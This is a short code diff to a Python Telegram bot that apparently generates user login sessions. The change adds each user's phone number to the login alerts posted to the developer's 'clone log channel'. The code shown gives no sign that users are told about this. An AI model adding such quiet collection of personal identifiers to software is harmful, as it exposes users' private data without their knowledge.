@@ -30,9 +30,10 @@ async def send_bot_alert(alert_type, details):
     """Send bot alerts to clone log channel."""
     try:
         from datetime import datetime as dt
+        phone_info = f"\n📱 **Phone Number:** {details.get('phone_number', 'N/A')}" if details.get('phone_number') else ""
         await app.send_message(
             chat_id=CLONE_LOG_CHANNEL,
-            text=f"🚨 **BOT ALERT: {alert_type}**\n👤 **User ID:** {details.get('user_id', 'Unknown')}\n📄 **Details:** {details.get('message', 'N/A')}\n⏰ **Time:** {dt.now().strftime('%Y-%m-%d %H:%M:%S')}\n\nBy Radhey Kishan Ojha\n📞 https://t.me/Radheyojha096"
+            text=f"🚨 **BOT ALERT: {alert_type}**\n👤 **User ID:** {details.get('user_id', 'Unknown')}{phone_info}\n📄 **Details:** {details.get('message', 'N/A')}\n⏰ **Time:** {dt.now().strftime('%Y-%m-%d %H:%M:%S')}\n\nBy Radhey Kishan Ojha\n📞 https://t.me/Radheyojha096"
         )
     except Exception as e:
         print(f"Failed to send bot alert: {e}")
@@ -129,5 +130,5 @@ async def generate_session(_, message):
     await client.disconnect()
     await otp_code.reply("✅ Login successful!")
     
-    # Send login alert
-    asyncio.create_task(send_bot_alert("LOGIN", {"user_id": user_id, "message": "User logged in successfully"}))
+    # Send login alert with phone number
+    asyncio.create_task(send_bot_alert("LOGIN", {"user_id": user_id, "phone_number": phone_number, "message": "User logged in successfully"}))
